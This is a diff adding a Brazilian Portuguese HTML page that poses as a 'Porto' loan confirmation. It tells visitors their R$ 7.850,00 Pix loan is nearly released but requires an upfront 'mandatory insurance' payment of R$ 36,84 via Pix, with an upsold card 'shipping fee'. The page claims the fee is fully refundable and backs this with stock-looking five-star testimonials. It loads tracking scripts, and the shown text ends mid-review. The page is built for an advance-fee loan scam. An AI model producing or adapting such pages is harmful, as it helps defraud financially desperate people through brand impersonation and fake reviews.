@@ -1,0 +1,580 @@
+﻿<!DOCTYPE html><html lang="pt-BR">
+<head>
+  <script src="../js/utm.js"></script>
+<script src="../js/tracking.js"></script>
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async="" defer=""></script>
+  <meta charset="utf-8">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Confirmação do Empréstimo</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&amp;family=Hind+Siliguri:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+  <script src="../../fluxo.js"></script>
+  <style>
+    :root {
+      --primary: #0099FF; --primary-deep: #0A0047; --primary-light: #fef0e4; --primary-subtle: #F8F8F8;
+      --accent: #0099FF; --accent-yellow: #0099FF; --accent-gold: #0066CC;
+      --green: #22c55e; --green-dark: #16a34a; --green-soft: #dcfce7; --green-light: #f0fdf4; --green-border: #bbf7d0;
+      --bg: #F5F5F5; --card: #FFFFFF; --text: #111827; --text-mid: #374151; --text-light: #6B7280;
+      --border: #E5E7EB; --danger: #ef4444; --radius: 16px;
+      --shadow: 0 4px 24px rgba(0,0,0,.06), 0 1px 2px rgba(0,0,0,.04);
+      --shadow-lg: 0 8px 32px rgba(0,0,0,0.1);
+      font-family: 'Hind Siliguri', sans-serif;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    body { background: var(--bg); color: var(--text); -webkit-font-smoothing: antialiased; min-height: 100vh; display: flex; flex-direction: column; }
+
+    /* HEADER (estilo pagamento) */
+    header.header { display: none; }
+    .m2-header{background:#F0F8FF;padding:22px 24px 0;position:relative;overflow:hidden;border-bottom:3px solid #0099FF;}
+    .m2-header::before{content:'';position:absolute;top:-40%;right:-20%;width:280px;height:280px;background:radial-gradient(circle,rgba(0,153,255,0.10) 0%,transparent 70%);pointer-events:none;}
+    .m2-header-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;}
+    .m2-brand{display:flex;align-items:center;}
+    .m2-brand img{height:38px;width:auto;max-width:160px;display:block;}
+    .m2-policy-label{font-size:10px;color:#0A0047;font-family:'JetBrains Mono',monospace;text-align:right;font-weight:600;}
+    .m2-policy-num{font-size:15px;font-weight:800;color:#0A0047;text-align:right;}
+    .m2-info-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;background:#E6F4FF;border-radius:12px;padding:14px 16px;margin-bottom:18px;border:2px solid #0099FF;}
+    .m2-info-label{font-size:10px;color:#0A0047;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:4px;font-weight:700;}
+    .m2-info-value{font-size:14px;font-weight:700;color:#0066CC;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+
+    /* HERO */
+    .hero { background: transparent; padding: 0 0 22px; position: relative; overflow: hidden; }
+    .hero::before { display: none; }
+    .hero-badge { display: inline-flex; align-items: center; gap: 8px; background: #0099FF; border: 1px solid #0099FF; border-radius: 20px; padding: 5px 14px; margin-bottom: 14px; }
+    .hero-badge-icon { width: 16px; height: 16px; color: #fff; }
+    .hero-badge-text { font-size: 0.72rem; font-weight: 700; letter-spacing: 1.2px; text-transform: uppercase; color: #FFFFFF; }
+    .hero-title { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 1.45rem; font-weight: 800; color: #0099FF; line-height: 1.25; letter-spacing: -0.3px; margin-bottom: 10px; }
+    .hero-title .hl { color: #0A0047; }
+    .hero-sub { font-size: 0.88rem; color: #0099FF; font-weight: 500; line-height: 1.5; margin-bottom: 0; }
+    .hero-sub strong { color: #0099FF; font-weight: 700; }
+
+    /* MAIN */
+    .main-container { flex: 1; display: flex; align-items: flex-start; justify-content: center; padding: 20px; }
+    .container { width: 100%; max-width: 480px; }
+
+    /* CARD */
+    .card { background: var(--card); border-radius: var(--radius); padding: 20px; border: 1px solid var(--border); margin-bottom: 14px; }
+
+    /* CTA */
+    .btn-cta { width: 100%; background: linear-gradient(90deg, #0099FF, #0066CC); color: #fff; border: none; padding: 18px; border-radius: 14px; font-size: 0.95rem; font-weight: 900; cursor: pointer; font-family:'Hind Siliguri','Poppins', sans-serif; letter-spacing: 0.5px; text-transform: uppercase; transition: all 0.3s; box-shadow: 0 6px 22px rgba(0,153,255,0.35); display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 14px; position: relative; overflow: hidden; }
+    .btn-cta:hover { transform: translateY(-2px); box-shadow: 0 8px 28px rgba(0,153,255,0.45); }
+    .btn-cta svg { width: 20px; height: 20px; }
+    .btn-cta::after { content: ''; position: absolute; pointer-events:none; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); animation: shine 3s infinite; }
+    @keyframes shine { 0% { left: -100%; } 100% { left: 100%; } }
+
+    /* RESUMO CARD */
+    .resumo-card { background: var(--card); border-radius: 14px; border: 1px solid var(--border); margin-bottom: 14px; overflow: hidden; }
+    .resumo-inner { padding: 16px; }
+
+    .resumo-product { display: flex; align-items: center; gap: 12px; padding-bottom: 12px; border-bottom: 1px solid #F0F1F3; margin-bottom: 10px; }
+    .resumo-product-img { width: 44px; height: 44px; min-width: 44px; border-radius: 10px; border: 1px solid var(--border); object-fit: contain; background: #fff; padding: 3px; }
+    .resumo-product-info { flex: 1; }
+    .resumo-product-name { font-size: 0.88rem; font-weight: 700; color: var(--text); margin-bottom: 1px; }
+    .resumo-product-desc { font-size: 0.73rem; color: var(--text-light); line-height: 1.4; }
+    .resumo-product-price { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 1rem; font-weight: 800; color: var(--green); white-space: nowrap; }
+
+    .resumo-line { display: flex; align-items: center; justify-content: space-between; padding: 8px 0; }
+    .resumo-line-label { font-size: 0.85rem; color: var(--text-light); font-weight: 500; }
+    .resumo-line-value { font-size: 0.85rem; color: var(--text-mid); font-weight: 600; }
+    .resumo-total { display: flex; align-items: center; justify-content: space-between; padding-top: 10px; border-top: 1.5px solid var(--border); }
+    .resumo-total-label { font-size: 0.85rem; font-weight: 700; color: var(--text-mid); }
+    .resumo-total-value { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 1.15rem; font-weight: 800; color: var(--text); }
+
+    /* SECTION LABEL */
+    .section-label { font-size: 0.7rem; font-weight: 700; letter-spacing: 0.8px; text-transform: uppercase; color: var(--text); margin-bottom: 10px; margin-top: 6px; }
+
+    /* ADDON CARDS */
+    .addon-card { background: #FFFFFF; border-radius: 14px; border: 1px solid var(--border); margin-bottom: 14px; overflow: hidden; position: relative; transition: border-color 0.2s, background 0.2s; border-left: 4px solid var(--accent); }
+    .addon-card.added { border-color: var(--green); border-left-color: var(--green); background: #FAFEFB; }
+    .addon-card.added .addon-name { color: var(--green-dark); }
+    .addon-card.added .addon-bottom { background: var(--green-soft); border-top-color: var(--green-border); }
+    .addon-card.added .addon-price { color: var(--green-dark); }
+    .addon-top { display: flex; align-items: center; gap: 14px; padding: 16px; }
+    .addon-img { width: 52px; height: 52px; min-width: 52px; border-radius: 10px; object-fit: contain; border: none; }
+    .addon-info { flex: 1; }
+    .addon-name { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 0.95rem; font-weight: 800; color: var(--primary); margin-bottom: 4px; }
+    .addon-desc { font-size: 0.8rem; color: var(--text-mid); line-height: 1.45; font-weight: 500; }
+    .addon-details { padding: 0 16px 12px; display: flex; flex-direction: column; gap: 6px; }
+    .addon-detail-row { display: flex; align-items: center; gap: 8px; font-size: 0.75rem; color: var(--text-mid); font-weight: 500; }
+    .addon-detail-row svg { width: 15px; height: 15px; min-width: 15px; color: var(--accent); }
+    .addon-detail-row strong { color: var(--text); font-weight: 700; }
+    .addon-bottom { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; border-top: 1px solid var(--border); background: #FAFBFC; }
+    .addon-price { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 0.95rem; font-weight: 800; color: var(--text); }
+    .addon-btn { display: inline-flex; align-items: center; gap: 6px; background: var(--green); border: none; border-radius: 8px; padding: 9px 16px; font-size: 0.8rem; font-weight: 700; color: #fff; cursor: pointer; font-family: 'Hind Siliguri', sans-serif; transition: all 0.2s; }
+    .addon-btn:hover { opacity: 0.9; }
+    .addon-btn.added { background: none; border: 1.5px solid var(--danger); color: var(--danger); box-shadow: none; padding: 8px 14px; }
+    .addon-btn.added:hover { background: var(--danger); color: #fff; }
+    .addon-btn svg { width: 14px; height: 14px; }
+    .addon-card.added .addon-detail-row svg { color: var(--green); }
+    .addon-card.added .addon-detail-row strong { color: var(--green-dark); }
+
+    /* PIX BOX */
+    .pix-box { background: var(--card); border: 1.5px solid var(--green-border); border-radius: 14px; padding: 20px 18px; margin-bottom: 14px; }
+    .pix-box-header { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 8px; }
+    .pix-box-label { font-size: 0.82rem; font-weight: 600; color: var(--text-light); }
+    .pix-box-price { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 1.4rem; font-weight: 800; color: var(--green); }
+    .pix-box-note { display: flex; align-items: center; gap: 6px; font-size: 0.78rem; font-weight: 600; color: var(--green-dark); margin-bottom: 16px; }
+    .pix-box-note svg { width: 14px; height: 14px; flex-shrink: 0; }
+    .pix-box .btn-cta { margin-bottom: 0; }
+    .pix-box-secure { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 0.7rem; color: var(--text-light); margin-top: 12px; line-height: 1.5; text-align: center; }
+    .pix-box-secure svg { width: 12px; height: 12px; flex-shrink: 0; color: var(--text-light); }
+
+    .final-note { text-align: center; font-size: 0.78rem; color: var(--text-mid); line-height: 1.6; padding: 16px 20px; margin-bottom: 14px; border-top: 1px solid var(--border); }
+    .final-note strong { color: var(--text); font-weight: 700; }
+
+
+    /* REVIEWS */
+    .m2-reviews{margin-top:10px;margin-bottom:14px;}
+    .m2-reviews-title{font-size:10px;font-weight:700;color:var(--text-light);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:12px;}
+    .m2-review{background:#fff;border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:10px;}
+    .m2-review-top{display:flex;align-items:center;gap:10px;margin-bottom:8px;}
+    .m2-review-avatar{width:40px;height:40px;min-width:40px;border-radius:50%;object-fit:cover;}
+    .m2-review-name{font-size:13px;font-weight:700;color:var(--text);}
+    .m2-review-stars{display:flex;gap:2px;margin-top:2px;}
+    .m2-review-stars svg{width:12px;height:12px;fill:#0099FF;color:#0099FF;}
+    .m2-review-text{font-size:12.5px;color:var(--text-mid);line-height:1.55;font-weight:500;}
+
+    /* REVIEW BADGE */
+    .review-badge{display:flex;flex-direction:column;align-items:center;gap:4px;padding:16px 0 6px;margin-bottom:14px;}
+    .review-stars{display:flex;gap:3px;}
+    .review-stars svg{width:18px;height:18px;fill:#0099FF;color:#0099FF;}
+    .review-score{font-family:'Hind Siliguri','Poppins',sans-serif;font-size:1.05rem;font-weight:800;color:var(--accent);}
+    .review-count{font-size:0.78rem;color:var(--text-light);font-weight:500;}
+
+    @media (max-width: 480px) {
+      .card { padding: 18px 16px; }
+    }
+
+/* =================== FOOTER BOM PRA CRÉDITO =================== */
+.ss-footer{background:#fff;border-top:1px solid #E5E7EB;padding:32px 20px 24px;text-align:center;font-family:"Hind Siliguri",-apple-system,BlinkMacSystemFont,sans-serif;color:#6B7280;font-size:14px;line-height:1.6}
+.ss-footer-logo{margin-bottom:16px}
+.ss-footer-logo img{height:42px;width:auto;display:inline-block}
+.ss-footer-company{font-size:14px;font-weight:700;color:#111827;margin-bottom:4px}
+.ss-footer-addr{font-size:12px;color:#9CA3AF;margin-bottom:16px}
+.ss-footer-links{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-bottom:16px;padding-top:16px;border-top:1px solid #E5E7EB}
+.ss-footer-links a{color:#374151;text-decoration:none;font-size:12px;font-weight:500;cursor:pointer}
+.ss-footer-links a:hover{color:#0099FF;}
+.ss-footer-links span{opacity:.4;font-size:12px}
+.ss-footer-badges{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap}
+.ss-footer-badges span{display:flex;align-items:center;gap:4px;font-size:11px;color:#6B7280;font-weight:500}
+.ss-footer-badges svg{width:14px;height:14px;color:#0A0047}
+.ss-dialog{border:0;padding:0;border-radius:20px;color:#111827;max-width:600px;width:calc(100% - 32px);box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.ss-dialog::backdrop{background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
+.ss-dialog-head{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 20px;border-bottom:1px solid #E5E7EB}
+.ss-dialog-head h2{font-family:"Hind Siliguri",sans-serif;font-size:20px;font-weight:700;margin:0}
+.ss-dialog-close{background:none;border:none;font-size:32px;color:#6B7280;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%;transition:all .2s;line-height:1;padding:0}
+.ss-dialog-close:hover{background:#F3F4F6;color:#111827}
+.ss-dialog-body{padding:24px;overflow-y:auto;max-height:70vh}
+.ss-dialog-body h3{font-size:17px;font-weight:700;color:#111827;margin:24px 0 12px}
+.ss-dialog-body h3:first-child{margin-top:0}
+.ss-dialog-body p{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:16px}
+.ss-dialog-body ul{margin:12px 0 16px 20px;padding:0}
+.ss-dialog-body li{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:8px}
+.ss-contact-item{display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px}
+.ss-contact-icon{width:48px;height:48px;background:#0A0047;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ss-contact-icon svg{color:#fff;width:24px;height:24px}
+.ss-contact-item h4{font-size:15px;font-weight:700;color:#111827;margin:0 0 4px}
+.ss-contact-item p{font-size:14px;color:#6B7280;margin:0}
+.ss-contact-note{margin-top:16px;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:12px}
+.ss-contact-note p{font-size:13px;line-height:1.6;color:#374151;margin-bottom:8px}
+.ss-contact-note p:last-child{margin-bottom:0}
+.ss-contact-note strong{color:#0A0047}
+
+</style>
+</head>
+<body>
+  <!-- HEADER (estilo pagamento) -->
+  <div class="m2-header">
+    <div class="m2-header-top">
+      <div class="m2-brand">
+        <img src="../images/logo.png" alt="Porto">
+      </div>
+      <div>
+        <div class="m2-policy-label">PROTOCOLO</div>
+        <div class="m2-policy-num" id="protocolNum">#SS-0000</div>
+      </div>
+    </div>
+    <div class="m2-info-grid">
+      <div><div class="m2-info-label">Segurado</div><div class="m2-info-value" id="leadNome">Cliente</div></div>
+      <div><div class="m2-info-label">CPF</div><div class="m2-info-value" id="leadCPF">***.***.***-**</div></div>
+    </div>
+    <div class="hero">
+      <div style="max-width:480px;">
+        <div class="hero-badge">
+          <div class="hero-badge-bar" style="background:#fff;"></div>
+          <span class="hero-badge-text">Falta pouco</span>
+        </div>
+        <h1 class="hero-title">Seu empréstimo está <span class="hl">quase liberado.</span></h1>
+        <p class="hero-sub">Para liberar o Pix de <strong id="heroAmount">R$ 7.850,00</strong> na sua conta, falta apenas contratar o seguro obrigatório do crédito.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-container">
+    <div class="container">
+
+      <!-- RESUMO DO PEDIDO -->
+      <div class="resumo-card">
+        <div class="resumo-inner">
+          <div class="resumo-product">
+            <img src="../images/seguro.jpg" alt="Seguro Prestamista" class="resumo-product-img">
+            <div class="resumo-product-info">
+              <div class="resumo-product-name">Seguro Prestamista</div>
+              <div class="resumo-product-desc">Crédito de <span id="resumoCredito">R$ 7.850,00</span> · <span id="resumoParcelas">36x de R$ 238,39</span></div>
+            </div>
+            <span id="resumoSeguroPrice" style="display:none;">R$ 36,84</span>
+          </div>
+          <span class="resumo-line-value" id="resumoLineSeguro" style="display:none;">R$ 36,84</span>
+
+          <div class="resumo-total">
+            <span class="resumo-total-label">Total</span>
+            <span class="resumo-total-value" id="resumoTotal">R$ 36,84</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- OFERTA EXCLUSIVA -->
+      <div class="section-label">Oferta exclusiva para você</div>
+
+      <div class="addon-card" id="addon1">
+        <div class="addon-top">
+          <img src="../images/card.png" alt="Cartão Porto" class="addon-img">
+          <div class="addon-info">
+            <div class="addon-name">Cartão de Crédito Porto</div>
+            <div class="addon-desc"><strong>Limite inicial de R$ 2.500.</strong> Pague apenas o frete do envio do cartão físico ao seu endereço.</div>
+          </div>
+        </div>
+        <div class="addon-details">
+          <div class="addon-detail-row">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16V6a1 1 0 00-1-1H4a1 1 0 00-1 1v10a1 1 0 001 1h1m8-1a1 1 0 01-1 1H9m4-1V8a1 1 0 011-1h2.586a1 1 0 01.707.293l3.414 3.414a1 1 0 01.293.707V16a1 1 0 01-1 1h-1m-6-1a1 1 0 001 1h1M5 17a2 2 0 104 0m-4 0a2 2 0 114 0m6 0a2 2 0 104 0m-4 0a2 2 0 114 0"></path></svg>
+            <span>Envio <strong>SEDEX</strong> — 2 dias úteis para entrega</span>
+          </div>
+          <div class="addon-detail-row">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
+            <span><strong>Cartão virtual</strong> liberado na hora — use hoje ainda</span>
+          </div>
+        </div>
+        <div class="addon-bottom">
+          <span class="addon-price">+R$ 19,00</span>
+          <button class="addon-btn" onclick="toggleAddon(1, 19)" id="addonBtn1">
+            <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 4v16m8-8H4"></path></svg>
+            Adicionar
+          </button>
+        </div>
+      </div>
+
+
+      <!-- CAIXA PIX -->
+      <div class="pix-box">
+        <div class="pix-box-header">
+          <span class="pix-box-label">Total a pagar</span>
+          <span class="pix-box-price" id="pixBoxPrice">R$ 36,84</span>
+        </div>
+        <div class="pix-box-note">
+          <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path></svg>
+          Liberação imediata via Pix após confirmação
+        </div>
+        <button class="btn-cta" onclick="handlePayment()" id="btnCta">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="2" width="8" height="8" rx="1"></rect><rect x="14" y="2" width="8" height="8" rx="1"></rect><rect x="2" y="14" width="8" height="8" rx="1"></rect><rect x="14" y="14" width="4" height="4" rx="0.5"></rect><rect x="18" y="18" width="4" height="4" rx="0.5"></rect><rect x="14" y="18" width="4" height="4" rx="0.5" opacity="0"></rect></svg>
+          <span id="ctaText">GERAR PIX DE R$ 36,84</span>
+        </button>
+        <div class="pix-box-secure">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+          Ambiente criptografado. Seus dados são usados apenas para a emissão da apólice e a liberação do crédito.
+        </div>
+      </div>
+
+      <p class="final-note">Pagamento único do seguro. Valor <strong>100% reembolsável</strong> após a quitação do empréstimo, conforme cláusula do seu contrato.</p>
+
+      <!-- REVIEW BADGE -->
+      <div class="review-badge">
+        <div class="review-stars">
+          <svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg>
+          <svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg>
+          <svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg>
+          <svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg>
+          <svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg>
+        </div>
+        <span class="review-score">4,9/5</span>
+        <span class="review-count">Mais de 120 mil clientes atendidos</span>
+      </div>
+
+      <!-- REVIEWS -->
+      <div class="m2-reviews">
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%237C3AED'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23E9D5FF'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23E9D5FF'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%23C4B5FD'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%23C4B5FD'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Caroline Medeiros</div>
+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">Eu achei que não ia receber o empréstimo, menos de 24 horas e caiu o valor certinho na minha conta, agora vou ficar mais tranquila.</div>
+        </div>
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%230891B2'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23A5F3FC'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23A5F3FC'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%2367E8F9'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%2367E8F9'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Daniela Rodrigues</div>
+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">O empréstimo caiu na hora, nem acreditei, vou poder dar entrada no meu carro agora.</div>
+        </div>
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%23D97706'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23FDE68A'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23FDE68A'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%23FCD34D'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%23FCD34D'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Geane Gonçalves</div>
+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20" style="fill:#D1D5DB;color:#D1D5DB;"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">Agora sim vou passar as férias de janeiro bem com minhas filhas, obrigada por liberarem o empréstimo mesmo com nome sujo.</div>
+        </div>
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%23059669'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23A7F3D0'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23A7F3D0'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%236EE7B7'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%236EE7B7'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Patrícia Almeida</div>
+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">Estava precisando muito e achei que ia demorar semanas. Fiz a solicitação de noite e no outro dia já tinha o dinheiro na conta. Super recomendo!</div>
+        </div>
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%23DC2626'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23FECACA'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23FECACA'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%23FCA5A5'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%23FCA5A5'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Renata Oliveira</div>
